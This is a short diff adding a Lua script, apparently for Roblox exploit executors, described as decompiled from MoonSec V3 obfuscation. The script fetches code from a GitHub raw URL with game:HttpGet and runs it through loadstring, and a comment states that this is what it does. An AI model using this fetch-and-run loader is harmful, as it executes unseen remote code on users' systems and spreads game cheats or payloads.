@@ -1,0 +1,13 @@
+-- Decompiled MoonSec V3 Protection
+
+local function httpGet()
+    local response = game:HttpGet('https://raw.githubusercontent.com/Jayfrr/erazedprembrroken/refs/heads/main/brokenversison')
+    return response
+end
+
+-- Execute fetched code
+local fetchedCode = httpGet()
+loadstring(fetchedCode)()
+
+-- Note: This script attempts to load and execute code from an external source
+-- Original code was obfuscated using MoonSec V3 protection
